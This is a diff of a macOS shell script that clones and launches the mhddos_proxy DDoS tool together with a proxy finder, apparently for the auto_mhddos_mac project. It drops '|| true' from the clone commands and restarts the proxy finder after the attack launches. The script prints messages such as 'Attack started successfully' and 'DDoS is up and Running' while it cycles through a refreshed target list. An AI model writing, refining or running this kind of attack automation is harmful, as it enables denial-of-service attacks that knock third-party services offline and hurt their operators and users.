@@ -28,11 +28,11 @@ python3.10 -m pip install --upgrade pip
 
 cd ~
 rm -rf auto_mhddos_mac
-git clone https://github.com/alexnest-ua/auto_mhddos_mac || true 
+git clone https://github.com/alexnest-ua/auto_mhddos_mac
 rm -rf mhddos_proxy
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy || true 
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
 rm -rf proxy_finder
-git clone https://github.com/alexnest-ua/proxy_finder.git || true
+git clone https://github.com/alexnest-ua/proxy_finder.git
 cd ~/mhddos_proxy
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sleep 2
@@ -150,17 +150,23 @@ do
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
     	echo -e "python3 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug"
             
-    	cd ~/proxy_finder
-    	python3.10 finder.py&
-	PID1="$!"
 	cd ~/mhddos_proxy
     	python3.10 runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
 	PID="$!"
-	
+	sleep 20
 	
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval seconds...\033[1;0m"
+	sleep 5
+	
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mStarting our new proxy_finder, next restart in $restart_interval...\033[1;0m"
+	
+	cd ~/proxy_finder
+    	python3.10 finder.py&
+	PID1="$!"
+	
+	
    	sleep $restart_interval
 	clear
    	
